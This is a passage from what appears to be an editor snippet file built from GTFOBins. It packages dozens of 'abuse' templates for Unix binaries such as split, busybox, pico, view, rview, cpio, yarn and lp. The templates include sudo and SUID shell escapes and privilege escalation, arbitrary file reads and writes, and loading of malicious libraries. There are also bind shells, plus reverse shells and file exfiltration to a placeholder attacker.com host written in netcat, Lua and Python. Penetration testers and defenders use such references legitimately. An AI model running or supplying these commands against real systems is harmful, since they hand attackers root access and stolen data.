            "```sh",
            "EXT=.xxx",
            "TF=\\$(mktemp)",
            "echo DATA >\\$TF",
            "split -b999m --additional-suffix \\$EXTENSION \\$TF${0}",
            "```"
        ],
        "description": "abuse split with file-write - GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough."
    },
    "split command (gtfobins)": {
        "prefix": "split command",
        "body": [
            "abuse split with command, Command execution using stdin (and close it directly).",
            "",
            "```sh",
            "COMMAND=id",
            "echo | split --filter=\\$COMMAND /dev/stdin${0}",
            "```"
        ],
        "description": "abuse split with command - Command execution using stdin (and close it directly)."
    },
    "split shell (gtfobins)": {
        "prefix": "split shell",
        "body": [
            "abuse split with shell, The shell prompt is not printed.",
            "",
            "```sh",
            "split --filter=/bin/sh /dev/stdin${0}",
            "```"
        ],
        "description": "abuse split with shell - The shell prompt is not printed."
    },
    "split sudo (gtfobins)": {
        "prefix": "split sudo",
        "body": [
            "abuse split with sudo, The shell prompt is not printed.",
            "",
            "```sh",
            "sudo split --filter=/bin/sh /dev/stdin${0}",
            "```"
        ],
        "description": "abuse split with sudo - The shell prompt is not printed."
    },
    "busybox shell (gtfobins)": {
        "prefix": "busybox shell",
        "body": [
            "abuse busybox with shell",
            "",
            "```sh",
            "busybox sh${0}",
            "```"
        ],
        "description": "abuse busybox with shell"
    },
    "busybox file-upload (gtfobins)": {
        "prefix": "busybox file-upload",
        "body": [
            "abuse busybox with file-upload, Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "busybox httpd -f -p \\$LPORT -h .${0}",
            "```"
        ],
        "description": "abuse busybox with file-upload - Serve files in the local folder running an HTTP server."
    },
    "busybox file-write (gtfobins)": {
        "prefix": "busybox file-write",
        "body": [
            "abuse busybox with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "busybox sh -c 'echo \"DATA\" > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse busybox with file-write"
    },
    "busybox file-read (gtfobins)": {
        "prefix": "busybox file-read",
        "body": [
            "abuse busybox with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./busybox cat \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse busybox with file-read"
    },
    "busybox suid (gtfobins)": {
        "prefix": "busybox suid",
        "body": [
            "abuse busybox with suid, It may drop the SUID privileges depending on the compilation flags and the runtime configuration.",
            "",
            "```sh",
            "./busybox sh${0}",
            "```"
        ],
        "description": "abuse busybox with suid - It may drop the SUID privileges depending on the compilation flags and the runtime configuration."
    },
    "busybox sudo (gtfobins)": {
        "prefix": "busybox sudo",
        "body": [
            "abuse busybox with sudo",
            "",
            "```sh",
            "sudo busybox sh${0}",
            "```"
        ],
        "description": "abuse busybox with sudo"
    },
    "busybox reverse-shell (gtfobins)": {
        "prefix": "busybox reverse-shell",
        "body": [
            "abuse busybox with reverse-shell, Run `nc -lvp 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "busybox nc -e /bin/sh \\$RHOST \\$RPORT${0}",
            "```"
        ],
        "description": "abuse busybox with reverse-shell - Run `nc -lvp 12345` on the attacker box to receive the shell."
    },
    "unsquashfs sudo (gtfobins)": {
        "prefix": "unsquashfs sudo",
        "body": [
            "abuse unsquashfs with sudo",
            "",
            "```sh",
            "sudo unsquashfs shell",
            "./squashfs-root/sh -p${0}",
            "```"
        ],
        "description": "abuse unsquashfs with sudo"
    },
    "unsquashfs suid (gtfobins)": {
        "prefix": "unsquashfs suid",
        "body": [
            "abuse unsquashfs with suid",
            "",
            "```sh",
            "./unsquashfs shell",
            "./squashfs-root/sh -p${0}",
            "```"
        ],
        "description": "abuse unsquashfs with suid"
    },
    "pico shell (gtfobins)": {
        "prefix": "pico shell",
        "body": [
            "abuse pico with shell, The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
            "",
            "```sh",
            "pico -s /bin/sh",
            "/bin/sh",
            "^T${0}",
            "```"
        ],
        "description": "abuse pico with shell - The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed."
    },
    "pico file-write (gtfobins)": {
        "prefix": "pico file-write",
        "body": [
            "abuse pico with file-write",
            "",
            "```sh",
            "pico ${1:file_to_write}",
            "DATA",
            "^O${0}",
            "```"
        ],
        "description": "abuse pico with file-write"
    },
    "pico file-read (gtfobins)": {
        "prefix": "pico file-read",
        "body": [
            "abuse pico with file-read",
            "",
            "```sh",
            "pico ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse pico with file-read"
    },
    "pico limited-suid (gtfobins)": {
        "prefix": "pico limited-suid",
        "body": [
            "abuse pico with limited-suid, The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.",
            "",
            "```sh",
            "./pico -s /bin/sh",
            "/bin/sh",
            "^T${0}",
            "```"
        ],
        "description": "abuse pico with limited-suid - The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed."
    },
    "pico sudo (gtfobins)": {
        "prefix": "pico sudo",
        "body": [
            "abuse pico with sudo",
            "",
            "```sh",
            "sudo pico",
            "^R^X",
            "reset; sh 1>&0 2>&0${0}",
            "```"
        ],
        "description": "abuse pico with sudo"
    },
    "pry shell (gtfobins)": {
        "prefix": "pry shell",
        "body": [
            "abuse pry with shell",
            "",
            "```sh",
            "pry",
            "system(\"/bin/sh\")${0}",
            "```"
        ],
        "description": "abuse pry with shell"
    },
    "pry sudo (gtfobins)": {
        "prefix": "pry sudo",
        "body": [
            "abuse pry with sudo",
            "",
            "```sh",
            "sudo pry",
            "system(\"/bin/sh\")${0}",
            "```"
        ],
        "description": "abuse pry with sudo"
    },
    "pry limited-suid (gtfobins)": {
        "prefix": "pry limited-suid",
        "body": [
            "abuse pry with limited-suid",
            "",
            "```sh",
            "./pry",
            "system(\"/bin/sh\")${0}",
            "```"
        ],
        "description": "abuse pry with limited-suid"
    },
    "lwp-request file-read (gtfobins)": {
        "prefix": "lwp-request file-read",
        "body": [
            "abuse lwp-request with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "lwp-request \"file://\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse lwp-request with file-read"
    },
    "lwp-request sudo (gtfobins)": {
        "prefix": "lwp-request sudo",
        "body": [
            "abuse lwp-request with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo lwp-request \"file://\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse lwp-request with sudo"
    },
    "redis file-write (gtfobins)": {
        "prefix": "redis file-write",
        "body": [
            "abuse redis with file-write, Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes.",
            "",
            "```sh",
            "IP=127.0.0.1",
            "redis-cli -h \\$IP",
            "config set dir dir_to_write_to",
            "config set dbfilename ${1:file_to_write}",
            "set x \"DATA\"",
            "save${0}",
            "```"
        ],
        "description": "abuse redis with file-write - Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes."
    },
    "ldconfig sudo (gtfobins)": {
        "prefix": "ldconfig sudo",
        "body": [
            "abuse ldconfig with sudo, This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"\\$TF\" > \"\\$TF/conf\"",
            "# move malicious libraries in \\$TF",
            "sudo ldconfig -f \"\\$TF/conf\"${0}",
            "```"
        ],
        "description": "abuse ldconfig with sudo - This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries."
    },
    "ldconfig limited-suid (gtfobins)": {
        "prefix": "ldconfig limited-suid",
        "body": [
            "abuse ldconfig with limited-suid, This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"\\$TF\" > \"\\$TF/conf\"",
            "# move malicious libraries in \\$TF",
            "./ldconfig -f \"\\$TF/conf\"${0}",
            "```"
        ],
        "description": "abuse ldconfig with limited-suid - This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries."
    },
    "pr file-read (gtfobins)": {
        "prefix": "pr file-read",
        "body": [
            "abuse pr with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pr -T \\$LFILE${0}",
            "```"
        ],
        "description": "abuse pr with file-read"
    },
    "pr suid (gtfobins)": {
        "prefix": "pr suid",
        "body": [
            "abuse pr with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pr -T \\$LFILE${0}",
            "```"
        ],
        "description": "abuse pr with suid"
    },
    "pr sudo (gtfobins)": {
        "prefix": "pr sudo",
        "body": [
            "abuse pr with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pr -T \\$LFILE${0}",
            "```"
        ],
        "description": "abuse pr with sudo"
    },
    "rpmquery shell (gtfobins)": {
        "prefix": "rpmquery shell",
        "body": [
            "abuse rpmquery with shell",
            "",
            "```sh",
            "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse rpmquery with shell"
    },
    "rpmquery limited-suid (gtfobins)": {
        "prefix": "rpmquery limited-suid",
        "body": [
            "abuse rpmquery with limited-suid",
            "",
            "```sh",
            "./rpmquery --eval '%{lua:os.execute(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse rpmquery with limited-suid"
    },
    "rpmquery sudo (gtfobins)": {
        "prefix": "rpmquery sudo",
        "body": [
            "abuse rpmquery with sudo",
            "",
            "```sh",
            "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse rpmquery with sudo"
    },
    "msguniq file-read (gtfobins)": {
        "prefix": "msguniq file-read",
        "body": [
            "abuse msguniq with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msguniq -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msguniq with file-read"
    },
    "msguniq sudo (gtfobins)": {
        "prefix": "msguniq sudo",
        "body": [
            "abuse msguniq with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo msguniq -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msguniq with sudo"
    },
    "msguniq suid (gtfobins)": {
        "prefix": "msguniq suid",
        "body": [
            "abuse msguniq with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./msguniq -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msguniq with suid"
    },
    "view shell (gtfobins)": {
        "prefix": "view shell",
        "body": [
            "abuse view with shell, This requires that `view` is compiled with Lua support.",
            "",
            "```sh",
            "view -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse view with shell - This requires that `view` is compiled with Lua support."
    },
    "view reverse-shell (gtfobins)": {
        "prefix": "view reverse-shell",
        "body": [
            "abuse view with reverse-shell, This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "view -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")",
            "vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse view with reverse-shell - This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "view non-interactive-reverse-shell (gtfobins)": {
        "prefix": "view non-interactive-reverse-shell",
        "body": [
            "abuse view with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "view -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse view with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed."
    },
    "view non-interactive-bind-shell (gtfobins)": {
        "prefix": "view non-interactive-bind-shell",
        "body": [
            "abuse view with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "view -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse view with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed."
    },
    "view file-upload (gtfobins)": {
        "prefix": "view file-upload",
        "body": [
            "abuse view with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "view -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse view with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed."
    },
    "view file-download (gtfobins)": {
        "prefix": "view file-download",
        "body": [
            "abuse view with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "view -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse view with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed."
    },
    "view file-write (gtfobins)": {
        "prefix": "view file-write",
        "body": [
            "abuse view with file-write",
            "",
            "```sh",
            "view ${1:file_to_write}",
            "iDATA",
            "^[",
            "w!${0}",
            "```"
        ],
        "description": "abuse view with file-write"
    },
    "view file-read (gtfobins)": {
        "prefix": "view file-read",
        "body": [
            "abuse view with file-read",
            "",
            "```sh",
            "view ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse view with file-read"
    },
    "view library-load (gtfobins)": {
        "prefix": "view library-load",
        "body": [
            "abuse view with library-load, This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse view with library-load - This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "view suid (gtfobins)": {
        "prefix": "view suid",
        "body": [
            "abuse view with suid, This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${0}",
            "```"
        ],
        "description": "abuse view with suid - This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "view sudo (gtfobins)": {
        "prefix": "view sudo",
        "body": [
            "abuse view with sudo, This requires that `view` is compiled with Lua support.",
            "",
            "```sh",
            "sudo view -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse view with sudo - This requires that `view` is compiled with Lua support."
    },
    "view capabilities (gtfobins)": {
        "prefix": "view capabilities",
        "body": [
            "abuse view with capabilities, This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse view with capabilities - This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "view limited-suid (gtfobins)": {
        "prefix": "view limited-suid",
        "body": [
            "abuse view with limited-suid, This requires that `view` is compiled with Lua support.",
            "",
            "```sh",
            "./view -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse view with limited-suid - This requires that `view` is compiled with Lua support."
    },
    "tbl file-read (gtfobins)": {
        "prefix": "tbl file-read",
        "body": [
            "abuse tbl with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tbl \\$LFILE${0}",
            "```"
        ],
        "description": "abuse tbl with file-read"
    },
    "tbl suid (gtfobins)": {
        "prefix": "tbl suid",
        "body": [
            "abuse tbl with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./tbl \\$LFILE${0}",
            "```"
        ],
        "description": "abuse tbl with suid"
    },
    "tbl sudo (gtfobins)": {
        "prefix": "tbl sudo",
        "body": [
            "abuse tbl with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo tbl \\$LFILE${0}",
            "```"
        ],
        "description": "abuse tbl with sudo"
    },
    "cpio shell (gtfobins)": {
        "prefix": "cpio shell",
        "body": [
            "abuse cpio with shell",
            "",
            "```sh",
            "echo '/bin/sh </dev/tty >/dev/tty' >localhost",
            "cpio -o --rsh-command /bin/sh -F localhost:${0}",
            "```"
        ],
        "description": "abuse cpio with shell"
    },
    "cpio file-read (gtfobins)": {
        "prefix": "cpio file-read",
        "body": [
            "abuse cpio with file-read, The whole directory structure is copied to `$TF`.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp -d)",
            "echo \"\\$LFILE\" | cpio -dp \\$TF",
            "cat \"\\$TF/\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cpio with file-read - The whole directory structure is copied to `$TF`."
    },
    "cpio file-write (gtfobins)": {
        "prefix": "cpio file-write",
        "body": [
            "abuse cpio with file-write, Copies `$LFILE` to the `$LDIR` directory.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\\$LFILE",
            "echo \\$LFILE | cpio -up \\$LDIR${0}",
            "```"
        ],
        "description": "abuse cpio with file-write - Copies `$LFILE` to the `$LDIR` directory."
    },
    "cpio suid (gtfobins)": {
        "prefix": "cpio suid",
        "body": [
            "abuse cpio with suid, Copies `$LFILE` to the `$LDIR` directory.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\\$LFILE",
            "echo \\$LFILE | ./cpio -R 0:0 -p \\$LDIR${0}",
            "```"
        ],
        "description": "abuse cpio with suid - Copies `$LFILE` to the `$LDIR` directory."
    },
    "cpio sudo (gtfobins)": {
        "prefix": "cpio sudo",
        "body": [
            "abuse cpio with sudo, Copies `$LFILE` to the `$LDIR` directory.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\\$LFILE",
            "echo \\$LFILE | sudo cpio -R 0:0 -p \\$LDIR${0}",
            "```"
        ],
        "description": "abuse cpio with sudo - Copies `$LFILE` to the `$LDIR` directory."
    },
    "nl file-read (gtfobins)": {
        "prefix": "nl file-read",
        "body": [
            "abuse nl with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nl -bn -w1 -s '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nl with file-read"
    },
    "nl suid (gtfobins)": {
        "prefix": "nl suid",
        "body": [
            "abuse nl with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./nl -bn -w1 -s '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nl with suid"
    },
    "nl sudo (gtfobins)": {
        "prefix": "nl sudo",
        "body": [
            "abuse nl with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo nl -bn -w1 -s '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse nl with sudo"
    },
    "rtorrent shell (gtfobins)": {
        "prefix": "rtorrent shell",
        "body": [
            "abuse rtorrent with shell",
            "",
            "```sh",
            "echo \"execute = /bin/sh,-c,\\\"/bin/sh <\\$(tty) >\\$(tty) 2>\\$(tty)\\\"\" >~/.rtorrent.rc",
            "rtorrent${0}",
            "```"
        ],
        "description": "abuse rtorrent with shell"
    },
    "rtorrent suid (gtfobins)": {
        "prefix": "rtorrent suid",
        "body": [
            "abuse rtorrent with suid",
            "",
            "```sh",
            "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <\\$(tty) >\\$(tty) 2>\\$(tty)\\\"\" >~/.rtorrent.rc",
            "./rtorrent${0}",
            "```"
        ],
        "description": "abuse rtorrent with suid"
    },
    "lp file-upload (gtfobins)": {
        "prefix": "lp file-upload",
        "body": [
            "abuse lp with file-upload, \nTo collect the file run the following on the attacker box (this requires `cups` to be installed):\n\n\n\n1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;\n\n2. `lpadmin -d printer` to set the new printer as default;\n\n3. `cupsctl --remote-any` to enable printing from the Internet;\n\n4. `nc -lkp 9100` to receive the file.\n\n\n\nSend a local file to a CUPS server.\n",
            "",
            "```sh",
            "LFILE=${1:file_to_send}",
            "RHOST=${2:attacker.com}",
            "lp \\$LFILE -h \\$RHOST${0}",
            "```"
        ],
        "description": "abuse lp with file-upload - \nTo collect the file run the following on the attacker box (this requires `cups` to be installed):\n\n\n\n1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;\n\n2. `lpadmin -d printer` to set the new printer as default;\n\n3. `cupsctl --remote-any` to enable printing from the Internet;\n\n4. `nc -lkp 9100` to receive the file.\n\n\n\nSend a local file to a CUPS server.\n"
    },
    "yarn shell (gtfobins)": {
        "prefix": "yarn shell",
        "body": [
            "abuse yarn with shell, Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `yarn --cwd $TF run preinstall`.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > \\$TF/package.json",
            "yarn --cwd \\$TF install${0}",
            "```"
        ],
        "description": "abuse yarn with shell - Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `yarn --cwd $TF run preinstall`."
    },
    "yarn sudo (gtfobins)": {
        "prefix": "yarn sudo",
        "body": [
            "abuse yarn with sudo",
            "",
            "```sh",
            "sudo yarn exec /bin/sh${0}",
            "```"
        ],
        "description": "abuse yarn with sudo"
    },
    "pax file-read (gtfobins)": {
        "prefix": "pax file-read",
        "body": [
            "abuse pax with file-read, The output is a `tar` archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pax -w \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse pax with file-read - The output is a `tar` archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files."
    },
    "rview shell (gtfobins)": {
        "prefix": "rview shell",
        "body": [
            "abuse rview with shell, This requires that `rview` is compiled with Lua support.",
            "",
            "```sh",
            "rview -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rview with shell - This requires that `rview` is compiled with Lua support."
    },
    "rview reverse-shell (gtfobins)": {
        "prefix": "rview reverse-shell",
        "body": [
            "abuse rview with reverse-shell, This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")",
            "vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse rview with reverse-shell - This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "rview non-interactive-reverse-shell (gtfobins)": {
        "prefix": "rview non-interactive-reverse-shell",
        "body": [
            "abuse rview with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "rview -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse rview with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rview non-interactive-bind-shell (gtfobins)": {
        "prefix": "rview non-interactive-bind-shell",
        "body": [
            "abuse rview with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "rview -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse rview with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rview file-upload (gtfobins)": {
        "prefix": "rview file-upload",
        "body": [
            "abuse rview with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "rview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse rview with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rview file-download (gtfobins)": {
        "prefix": "rview file-download",
        "body": [
            "abuse rview with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "rview -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse rview with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rview` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rview file-write (gtfobins)": {
        "prefix": "rview file-write",
        "body": [
            "abuse rview with file-write",
            "",
            "```sh",
            "rview ${1:file_to_write}",
            "iDATA",
            "^[",
            "w!${0}",
            "```"
        ],
        "description": "abuse rview with file-write"
    },
    "rview file-read (gtfobins)": {
        "prefix": "rview file-read",
        "body": [
            "abuse rview with file-read",
            "",
            "```sh",
            "rview ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse rview with file-read"
    },
    "rview library-load (gtfobins)": {
        "prefix": "rview library-load",
        "body": [
            "abuse rview with library-load, This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "rview -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse rview with library-load - This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rview suid (gtfobins)": {
        "prefix": "rview suid",
        "body": [
            "abuse rview with suid, This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
